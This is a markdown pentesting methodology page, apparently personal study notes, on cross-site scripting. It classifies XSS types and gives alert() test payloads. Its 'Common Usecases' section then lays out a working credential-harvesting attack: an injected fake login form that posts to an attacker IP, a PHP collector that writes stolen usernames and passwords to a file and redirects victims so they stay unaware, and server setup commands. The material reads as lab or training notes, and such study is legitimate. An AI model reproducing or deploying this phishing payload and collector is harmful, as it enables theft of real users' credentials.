---
type: methodology
category: web-pentesting
tags:
  - xss
  - client-side
  - web
aliases:
  - Cross-Site Scripting
  - XSS Methodology
---
# Cross-Site Scripting (XSS) Methodology

**Description:** Client-side code injection vulnerability occurring when an application includes untrusted data in a web page without proper validation or escaping. This allows attackers to execute arbitrary JavaScript in the victim's browser context (session hijacking, defacement, credential harvesting, CSRF amplification).

---

## 00 - XSS Types & Classification

| Type | Mechanism | Persistence / Target |
| :--- | :--- | :--- |
| **Reflected (Non-Persistent)** | Payload is included in the immediate HTTP request (URL parameter/form) and reflected in the response. | Single victim via malicious link/phishing. |
| **Stored (Persistent)** | Payload is permanently stored on the target server (Database, Comment field, Profile settings) and served to users later. | Multiple/All users visiting the affected page. |
| **DOM-based** | Vulnerability exists entirely in client-side code (JavaScript takes unsafe input from a source like `location.search` and passes it to a sink like `eval()` or `innerHTML`). | Client-side execution without server-side reflection. |

---

## 01 - Eumeration

### XSS-Discovery
[ZAP](03%20Tools/ZAP.md) is well suited for detecting XSS-Vulnerabilites.

![XSS-Discovery - XSStrike.py](03%20Tools/Scripts/Scripts.md#XSS-Discovery%20-%20XSStrike.py)

### XSS-Test

#### show origin-URL 
```html
<script>alert(window.origin)</script>
```
as image:
```html
<img src="" onerror=alert(window.origin)>
```
#### show cookie
```html
<script>alert(document.cookie)</script>
```
as image:
```html
<img src="" onerror=alert(document.cookie)>
```

## 02 - Common Usecases

### Fake Login form
#### Setting up fake form
This fake login form will send the credentials, which victims entered to our specified IP:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
We can upload it inside the java script function `document.write`:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP:80><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
In order to remove the original URL-form we can add `document.getElementById('URLFROM-NAME').remove()`  and wrap the whole thing in the XSS-format, which our target is vulnerable to, for example (in this case reflected XSS):
```javascript
javascript:document.write('<h3>Please login to continue</h3><form action=http://10.10.14.72:80><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

#### Setting up listener
After uploading the XSS, we can either start a simple `NC listener` or setup a temporary PHP server, which catches the credentials and forwards them to the original page, as a result, the victim is unaware of anything happening to him. This is an example `index.php` file:
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://ORIGINAL_SERVER_IP/PATH_TO_FORM");
    fclose($file);
    exit();
}
?>
```

We can setup the php server as follows:
1. Create webroot:
```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
```
2. Create index.php and paste php-forwarder into it:
```bash
nano index.php
```

3. Start php-server:
```bash
sudo php -S 0.0.0.0:80
```

### Session Hijacking
